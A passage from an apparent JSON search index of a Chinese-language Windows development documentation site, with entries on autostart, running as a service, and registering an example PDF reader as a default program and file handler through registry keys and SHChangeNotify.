install","title":"\u4f5c\u4e3a\u72ec\u7acb\u4e8e\u7528\u6237\u767b\u5f55\u7684\u670d\u52a1\u8fd0\u884c"},{"location":"windows_development/autostart/#third-party-tools","text":"\u6709\u8bb8\u591a\u7b2c\u4e09\u65b9\u5b9e\u7528\u7a0b\u5e8f\u65e8\u5728\u5e2e\u52a9\u66f4\u8f7b\u677e\u5730\u5b89\u88c5\u548c\u8fd0\u884c\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u901a\u5e38\u63d0\u4f9b\u4e00\u4e2a\u5b89\u88c5\u7a0b\u5e8f\u3001\u4e00\u4e2a\u81ea\u52a8\u542f\u52a8\u7a0b\u5e8f\u7684\u9009\u9879\uff0c\u4ee5\u53ca\u66f4\u7cbe\u81f4\u7684\u7528\u6237\u4f53\u9a8c\u3002","title":"\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177"},{"location":"windows_development/shell_development/default_programs/","text":"\u9ed8\u8ba4\u7a0b\u5e8f \uf0c1 \u4f7f\u7528 \u9ed8\u8ba4\u7a0b\u5e8f \u8bbe\u7f6e\u9ed8\u8ba4\u7528\u6237\u4f53\u9a8c\u3002 1.\u6ce8\u518c\u5e94\u7528\u7a0b\u5e8f \u67e5\u627e\u53ef\u6267\u884c\u6587\u4ef6\uff1a\u60f3\u8981ShellExecuteEx\u80fd\u591f\u627e\u5230\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5728HKEY_LOCAL_MACHINE \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ App Paths\u4e0b\u6ce8\u518c\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u4f8b\u5982 App Paths ThunderPdf.exe (Default) = D:\\VS Projects\\Win32Project\\Debug\\ThunderPdf.exe path D:\\VS Projects\\Win32Project\\Debug \u6ce8\u518c\u7a0b\u5e8f\u6807\u8bc6\u7b26ProgID \u901a\u8fc7\u5728HKEY_CLASSES_ROOT \\ Applications \\ ApplicationName.exe\u5b50\u9879\u4e0b\u5305\u542b\u6ce8\u518c\u8868\u9879\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u63d0\u4f9b\u4e0b\u8868\u4e2d\u663e\u793a\u7684\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\u3002 HKEY_CLASSES_ROOT Applications wordpad.exe FriendlyAppName = @%SystemRoot%\\System32\\shell32.dll,-22069 SupportedTypes .3gp2 DefaultIcon (Default) = %SystemRoot%\\system32\\wmploc.dll,-730 shell open command (Default) = \"D:\\VS Projects\\Win32Project\\Debug\\ThunderPdf.exe\" \"%1\" \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\RegisteredApplications\u4e0b\u6dfb\u52a0\u5b50\u9879\"ThunderPdf\"\uff0c\u503c\u4e3a\"Software\\ThunderPdf\\Capabilities\" \u5bf9\u5e94\u7684\u5728\"\u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\"\u521b\u5efa\"Software\\ThunderPdf\\Capabilities\"\u4f8b\u5982 ThunderPdf Capabilities ApplicationDescription \u8fc5\u96f7PDF\u662f\u4e00\u6b3e\u8d85\u597d\u7528\u7684PDF\u9605\u8bfb\u5668\u3002 ApplicationIcon \"D:\\VS Projects\\Win32Project\\x64\\Debug\\ThunderPdf.exe\",0 ApplicationName \u8fc5\u96f7PDF FileAssociations .pdf ThunderPdf.pdf 2.\u6587\u4ef6\u7684\u6253\u5f00\u65b9\u5f0f\u7684\u201c\u63a8\u8350\u7a0b\u5e8f\u201d\u7684\u6ce8\u518c\u8868\u5730\u5740 \u8ba1\u7b97\u673a\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts.pdf\\OpenWithList \u4f7f\u7528IApplicationAssociationRegistrationUI\u63a5\u53e3\u8bbe\u7f6e\u9ed8\u8ba4\u7a0b\u5e8f 3.\u901a\u77e5\u7cfb\u7edf\u65b0\u7684\u5173\u8054\u9009\u62e9\u53ef\u7528 SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_DWORD | SHCNF_FLUSH, nullptr, nullptr); \u53c2\u8003\u8d44\u6599 \uf0c1 Win32 \u9ed8\u8ba4\u7a0b\u5e8f","title":"\u9ed8\u8ba4\u7a0b\u5e8f"},{"location":"windows_development/shell_development/default_programs/#_1","text":"\u4f7f\u7528 \u9ed8\u8ba4\u7a0b\u5e8f \u8bbe\u7f6e\u9ed8\u8ba4\u7528\u6237\u4f53\u9a8c\u3002 1.\u6ce8\u518c\u5e94\u7528\u7a0b\u5e8f \u67e5\u627e\u53ef\u6267\u884c\u6587\u4ef6\uff1a\u60f3\u8981ShellExecuteEx\u80fd\u591f\u627e\u5230\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5728HKEY_LOCAL_MACHINE \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ App Paths\u4e0b\u6ce8\u518c\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u4f8b\u5982 App Paths ThunderPdf.exe (Default) = D:\\VS Projects\\Win32Project\\Debug\\ThunderPdf.exe path D:\\VS Projects\\Win32Project\\Debug \u6ce8\u518c\u7a0b\u5e8f\u6807\u8bc6\u7b26ProgID \u901a\u8fc7\u5728HKEY_CLASSES_ROOT \\ Applications \\ ApplicationName.exe\u5b50\u9879\u4e0b\u5305\u542b\u6ce8\u518c\u8868\u9879\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u63d0\u4f9b\u4e0b\u8868\u4e2d\u663e\u793a\u7684\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\u3002 HKEY_CLASSES_ROOT Applications wordpad.exe FriendlyAppName = @%SystemRoot%\\System32\\shell32.dll,-22069 SupportedTypes .3gp2 DefaultIcon (Default) = %SystemRoot%\\system32\\wmploc.dll,-730 shell open command (Default) = \"D:\\VS Projects\\Win32Project\\Debug\\ThunderPdf.exe\" \"%1\" \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\RegisteredApplications\u4e0b\u6dfb\u52a0\u5b50\u9879\"ThunderPdf\"\uff0c\u503c\u4e3a\"Software\\ThunderPdf\\Capabilities\" \u5bf9\u5e94\u7684\u5728\"\u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\"\u521b\u5efa\"Software\\ThunderPdf\\Capabilities\"\u4f8b\u5982 ThunderPdf Capabilities ApplicationDescription \u8fc5\u96f7PDF\u662f\u4e00\u6b3e\u8d85\u597d\u7528\u7684PDF\u9605\u8bfb\u5668\u3002 ApplicationIcon \"D:\\VS Projects\\Win32Project\\x64\\Debug\\ThunderPdf.exe\",0 ApplicationName \u8fc5\u96f7PDF FileAssociations .pdf ThunderPdf.pdf 2.\u6587\u4ef6\u7684\u6253\u5f00\u65b9\u5f0f\u7684\u201c\u63a8\u8350\u7a0b\u5e8f\u201d\u7684\u6ce8\u518c\u8868\u5730\u5740 \u8ba1\u7b97\u673a\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts.pdf\\OpenWithList \u4f7f\u7528IApplicationAssociationRegistrationUI\u63a5\u53e3\u8bbe\u7f6e\u9ed8\u8ba4\u7a0b\u5e8f 3.\u901a\u77e5\u7cfb\u7edf\u65b0\u7684\u5173\u8054\u9009\u62e9\u53ef\u7528 SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_DWORD | SHCNF_FLUSH, nullptr, nullptr);","title":"\u9ed8\u8ba4\u7a0b\u5e8f"},{"location":"windows_development/shell_development/default_programs/#references","text":"Win32 \u9ed8\u8ba4\u7a0b\u5e8f","title":"\u53c2\u8003\u8d44\u6599"},{"location":"windows_development/shell_development/file_association/","text":"\u6587\u4ef6\u5173\u8054 \uf0c1 \u8bbe\u7f6e\u6587\u4ef6\u5173\u8054\u548c\u9ed8\u8ba4\u7684\u6253\u5f00\u65b9\u5f0f\u3002 \u81ea\u5b9a\u4e49\u6587\u4ef6\u683c\u5f0f \u6ce8\u518c\u8868 \uf0c1 \u53c2\u8003\u8d44\u6599 \uf0c1 Win32 \u9ed8\u8ba4\u7a0b\u5e8f","title":"\u6587\u4ef6\u5173\u8054"},{"location":"windows_development/shell_development/file_association/#_1","text":"\u8bbe\u7f6e\u6587\u4ef6\u5173\u8054\u548c\u9ed8\u8ba4\u7684\u6253\u5f00\u65b9\u5f0f\u3002 \u81ea\u5b9a\u4e49\u6587\u4ef6\u683c\u5f0f","title":"\u6587\u4ef6\u5173\u8054"},{"location":"windows_development/shell_development/file_association/#_2","text":"","title":"\u6ce8\u518c\u8868"},{"location":"windows_development/shell_development/file_association/#references","text":"Win32 \u9ed8\u8ba4\u7a0b\u5e8f","title":"\u53c2\u8003\u8d44\u6599"}]}